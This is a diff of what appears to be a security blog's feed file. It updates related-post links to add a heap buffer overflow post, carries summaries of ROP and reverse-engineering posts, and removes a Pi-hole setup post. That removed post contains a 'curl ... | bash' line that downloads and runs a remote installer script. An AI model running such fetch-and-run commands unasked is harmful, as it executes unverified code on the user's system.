+  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
+  &lt;ul class=&quot;post-list&quot;&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
+          Creating a Barebones Windows Debugger
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+  &lt;/ul&gt;
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Earlier today, I was messing around with some code, and I came up with this vulnerable program. This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn’t a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).</summary></entry><entry><title type="html">Return Oriented Programming Tutorial</title><link href="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html" rel="alternate" type="text/html" title="Return Oriented Programming Tutorial" /><published>2020-10-14T00:00:00-04:00</published><updated>2020-10-14T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/14/return-oriented-programming-tutorial</id><content type="html" xml:base="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html">&lt;p&gt;In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to execute code when NX is enabled. I will also be solving one of ROP Emporium’s challenges by using a ROP chain.&lt;/p&gt;
 
 &lt;h3 id=&quot;what-is-nx&quot;&gt;What is NX?&lt;/h3&gt;
 
@@ -330,6 +540,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
         &lt;/a&gt;
@@ -338,12 +554,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -494,6 +704,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -502,12 +718,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -868,6 +1078,12 @@ void ReadMemory(char *addr_hex, int n) {
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -876,12 +1092,6 @@ void ReadMemory(char *addr_hex, int n) {
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1076,6 +1286,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -1084,12 +1300,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1135,6 +1345,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -1143,12 +1359,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1178,6 +1388,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -1186,12 +1402,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1245,6 +1455,12 @@ c7(): rax = 0x22
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -1253,12 +1469,6 @@ c7(): rax = 0x22
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1778,6 +1988,12 @@ exploit
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -1786,12 +2002,6 @@ exploit
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1905,74 +2115,4 @@ optional arguments:
                         the starting and stopping breakpoints.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The script can be found &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for this simple tool came from.</summary></entry><entry><title type="html">Network-wide Ad Blocking Using Pi-hole</title><link href="http://localhost:4000/2019/06/15/pi-hole-ad-blocker.html" rel="alternate" type="text/html" title="Network-wide Ad Blocking Using Pi-hole" /><published>2019-06-15T00:00:00-04:00</published><updated>2019-06-15T00:00:00-04:00</updated><id>http://localhost:4000/2019/06/15/pi-hole-ad-blocker</id><content type="html" xml:base="http://localhost:4000/2019/06/15/pi-hole-ad-blocker.html">&lt;p&gt;As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using &lt;a href=&quot;https://pi-hole.net/&quot;&gt;Pi-hole&lt;/a&gt;. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.&lt;/p&gt;
-
-&lt;p&gt;So lets get right into how I did this. The first thing I did was that I SSH’ed into my raspberry pi and typed in the below command to start installing Pi-hole.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -sSL https://install.pi-hole.net | bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/installing.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After that, I had to select the upstream DNS provider, which is who my raspberry pi would forward DNS requests to if the DNS query is not on the blacklist. I like to use &lt;a href=&quot;https://www.quad9.net/&quot;&gt;Quad9’s DNS server&lt;/a&gt; as opposed to Google’s DNS server (or any other popular DNS server) because Quad9 uses threat intelligence in order to block malware and other threats.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/quad9.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pi-hole also asked me if I wanted to change the third-party lists that they use or if I wanted to change which protocol they used. I kept the default values.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/lists.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/protocols.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I kept my current network settings.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/ip.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I kept the default values for everything else.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/webadmin.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/lighttpd.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/logging.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/privacy.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/complete.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Once everything was done on my raspberry pi’s side, I had to go into my router settings to change the DNS server settings so that they pointed to my new DNS server. I used Quad9’s DNS server as my backup secondary DNS server in case my raspberry pi failed for whatever reason.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/dnssettings.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I also went ahead and changed my current raspberry pi’s IP address to be a static IP address that the DHCP server could not change.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/staticip.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finally, everything was finished. I could now login to my Pi-hole’s web admin page and see it all running.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/webpage.png&quot; /&gt;&lt;/p&gt;
-
-&lt;section class=&quot;related&quot;&gt;
-  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
-  &lt;ul class=&quot;post-list&quot;&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-  &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using Pi-hole. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.</summary></entry></feed>
+&lt;p&gt;The script can be found &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for this simple tool came from.</summary></entry></feed>
